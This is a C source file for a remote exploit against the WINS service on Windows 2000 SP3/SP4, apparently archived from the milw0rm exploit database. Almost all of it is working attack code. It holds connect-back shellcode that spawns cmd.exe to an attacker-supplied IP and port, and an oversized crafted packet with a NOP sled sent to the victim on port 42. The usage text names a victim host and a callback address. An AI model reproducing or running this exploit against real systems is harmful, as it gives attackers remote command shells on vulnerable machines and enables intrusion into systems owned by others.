/*************************************************************/
/* ZUCWins 0.1 - Wins 2000 remote root exploit                                     */
/* Exploit by: zuc <zuc@hack.it>              		                         */ 
/* works on Windows 2000 SP3/SP4 probably every language                  */
/*************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <curses.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

	char shellcode[] =
"\xeb\x25\xe9\xfa\x99\xd3\x77\xf6\x02\x06\x6c\x59\x6c\x59\xf8"
"\x1d\x9c\xde\x8c\xd1\x4c\x70\xd4\x03\x58\x46\x57\x53\x32\x5f"
"\x33\x32\x2e\x44\x4c\x4c\x01\xeb\x05\xe8\xf9\xff\xff\xff\x5d"
"\x83\xed\x2c\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c"
"\xad\x8b\x78\x08\x8d\x5f\x3c\x8b\x1b\x01\xfb\x8b\x5b\x78\x01"
"\xfb\x8b\x4b\x1c\x01\xf9\x8b\x53\x24\x01\xfa\x53\x51\x52\x8b"
"\x5b\x20\x01\xfb\x31\xc9\x41\x31\xc0\x99\x8b\x34\x8b\x01\xfe"
"\xac\x31\xc2\xd1\xe2\x84\xc0\x75\xf7\x0f\xb6\x45\x09\x8d\x44"
"\x45\x08\x66\x39\x10\x75\xe1\x66\x31\x10\x5a\x58\x5e\x56\x50"
"\x52\x2b\x4e\x10\x41\x0f\xb7\x0c\x4a\x8b\x04\x88\x01\xf8\x0f"
"\xb6\x4d\x09\x89\x44\x8d\xd8\xfe\x4d\x09\x75\xbe\xfe\x4d\x08"
"\x74\x17\xfe\x4d\x24\x8d\x5d\x1a\x53\xff\xd0\x89\xc7\x6a\x02"
"\x58\x88\x45\x09\x80\x45\x79\x0c\xeb\x82\x50\x8b\x45\x04\x35"
"\x93\x93\x93\x93\x89\x45\x04\x66\x8b\x45\x02\x66\x35\x93\x93"
"\x66\x89\x45\x02\x58\x89\xce\x31\xdb\x53\x53\x53\x53\x56\x46"
"\x56\xff\xd0\x89\xc7\x55\x58\x66\x89\x30\x6a\x10\x55\x57\xff"
"\x55\xe0\x8d\x45\x88\x50\xff\x55\xe8\x55\x55\xff\x55\xec\x8d"
"\x44\x05\x0c\x94\x53\x68\x2e\x65\x78\x65\x68\x5c\x63\x6d\x64"
"\x94\x31\xd2\x8d\x45\xcc\x94\x57\x57\x57\x53\x53\xfe\xca\x01"
"\xf2\x52\x94\x8d\x45\x78\x50\x8d\x45\x88\x50\xb1\x08\x53\x53"
"\x6a\x10\xfe\xce\x52\x53\x53\x53\x55\xff\x55\xf0\x6a\xff\xff"
"\x55\xe4";

char mess[] =
"\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"
//  "\x00\x03\x0d\x4c\x77\x77\xFF\x77\x05\x4e\x00\x3c\x01\x02\x03\x04"
	
"\x6c\xf4\x3d\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\
x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05\x00\x02\x4e\x05";
char rep[] =
	
"\x90\x01\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x00\
x4e\x05\x90\x00\x4e\x05\x90\x00\x4e\x05\x90\x03\x4e\x05\x90\x00\x4e\x05";
void usage();

int main(int argc, char *argv[])
{ 
int i,sock,sock2,sock3,addr,len=16;
int rc;
  unsigned long XORIP = 0x93939393;
  unsigned short XORPORT = 0x9393;
int cbport;
long cbip;

struct sockaddr_in mytcp;
struct hostent * hp;

if(argc<4 || argc>4)
usage();

cbport = htons(atoi(argv[3]));
cbip = inet_addr(argv[2]);
cbport ^= XORPORT;
cbip ^= XORIP;
memcpy(&shellcode[2],&cbport,2);
memcpy(&shellcode[4],&cbip,4);

char mess2[200000];
memset(mess2,0,sizeof(mess2));
char mess3[210000];
memset(mess3,0,sizeof(mess3));
int ir;
for(ir =0;ir<200000;ir++)mess2[ir]='\x90';
memcpy(mess3,mess,sizeof(mess)-1);
int r=0;int le=sizeof(mess)-1;
for(r;r<30;r++)
{
	memcpy(mess3+le,rep,sizeof(rep)-1);
	le+=sizeof(rep)-1;
}
memcpy(mess3+le,mess2,200000);
memcpy(mess3+le+198000,shellcode,sizeof(shellcode));
int lenr=le+200000+sizeof(shellcode);
hp = gethostbyname(argv[1]);

addr = inet_addr(argv[1]);

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
//printf("socket() error...\n");
exit(-1);
}

mytcp.sin_addr.s_addr = addr;

mytcp.sin_family = AF_INET;

mytcp.sin_port=htons(42);

printf("[*] connecting the target\n");

rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct 
sockaddr_in));
printf("[*] sending exploit\n");
send(sock,mess3,lenr,0);
printf("[*] exploit sent\n");
sleep(5);
shutdown(sock,1);
close(sock);
shutdown(sock,2);
close(sock2);
shutdown(sock,3);
close(sock3);
exit(0);
}

void usage()
{
unsigned int a;
printf("\nUsage: <victim-host> <connectback-ip> <connectback port>\n");
printf("Sample: ZUC-WINShit www.vulnwins.com 31.33.7.23 31337\n\n");
exit(0);
}

// milw0rm.com [2004-12-31]
